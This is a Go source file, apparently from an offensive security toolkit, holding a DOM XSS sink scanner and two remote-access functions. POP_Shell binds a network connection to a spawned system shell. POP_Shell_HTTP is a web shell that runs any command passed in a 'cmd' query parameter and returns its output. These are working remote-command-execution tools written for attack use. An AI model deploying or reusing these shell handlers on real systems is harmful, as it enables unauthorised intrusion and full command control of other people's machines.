/*

Does:
	All web vulnerabilitiy testers

Alot of this was previously broken tools moved to new modules, updated to the newest standard, and modernized
*/

package web

import (
	"fmt"
	"io/ioutil"
	v "main/modg/colors"
	httpreqconst "main/modg/constants/webconst"
	httpreqtypes "main/modg/types"
	tcpmessages "main/modules/tcp"
	"net"
	"net/http"
	"os/exec"
	"strings"
)

func Find(i []string) []httpreqtypes.Result {
	for _, d := range i {
		fmt.Println(v.WHT, "[*] Checking URL for DOM XSS -> ", d)
		httpreqconst.Request_limit <- d
		httpreqconst.Wg.Add(1)
		go func(da string) {
			defer httpreqconst.Wg.Done()
			defer func() {
				<-httpreqconst.Request_limit
			}()
			response, e := http.Get(da)
			httpreqconst.Mutmod.Lock()
			if e == nil {
				body, err := ioutil.ReadAll(response.Body)
				if err == nil && len(body) != 0 {
					sb := string(body)
					results := CheckSinks(sb, da)
					httpreqconst.Content_results = append(httpreqconst.Content_results, results...)
				}
				response.Body.Close()
			}
			httpreqconst.Mutmod.Unlock()
		}(d)
	}
	httpreqconst.Wg.Wait()
	return httpreqconst.Content_results
}

func CheckSinks(response_body string, url string) []httpreqtypes.Result {
	var r []httpreqtypes.Result
	t1 := strings.ToLower(response_body)
	t2 := strings.ReplaceAll(t1, " ", "")
	for _, sink := range httpreqconst.DOM {
		fmt.Println("\033[38;5;55m|\033[38;5;43m+\033[38;5;55m| Checking for sink -> ", sink)
		if strings.Contains(t2, sink) {
			res := httpreqtypes.Result{
				Result_Sink: sink, Url: url}
			r = append(r, res)
		} else {
			fmt.Println("[-] Test: \033[31m(FAILED) Sink not in body", v.WHT)
		}
	}
	return r
}

func POP_Shell(connection net.Conn) {
	fmt.Printf("\033[38;5;55m|\033[38;5;43m+\033[38;5;55m| Information  \t: Got Connection from |%s\n", connection.RemoteAddr())
	fmt.Printf("\033[38;5;55m|\033[38;5;43m+\033[38;5;55m| Information  \t: Spawning Shell....  |\n")
	fmt.Printf("\033[38;5;55m|\033[38;5;43m+\033[38;5;55m| Information  \t: Local Address       |%s\n", connection.LocalAddr())
	connection.Write(tcpmessages.Shell_msg)
	sh := exec.Command(tcpmessages.Shell)
	sh.Stdin = connection
	sh.Stdout = connection
	sh.Stderr = connection
	sh.Run()
}

func POP_Shell_HTTP(w http.ResponseWriter, r *http.Request) {
	exe := r.URL.Query().Get("cmd")
	if exe == "" {
		fmt.Fprintln(w, "Please Provide a command: ex->(/?cmd=ls)")
		return
	}
	fmt.Printf("\033[38;5;55m|\033[38;5;43m+\033[38;5;55m| Information  \t: Got a request from (%s) command (%s) ", r.RemoteAddr, exe)
	fmt.Fprintf(w, "REQUESTED COMMAND -> %s", exe)
	out := exec.Command(tcpmessages.Shell, tcpmessages.Shell_ARGUMENT, exe)
	o, x := out.Output()
	if x != nil {
		fmt.Println(v.REDHB, "<RR6> Got error when trying to run the given command -> ", x)
	} else {
		fmt.Fprintf(w, "Command Output $> %s\n", o)
	}
}
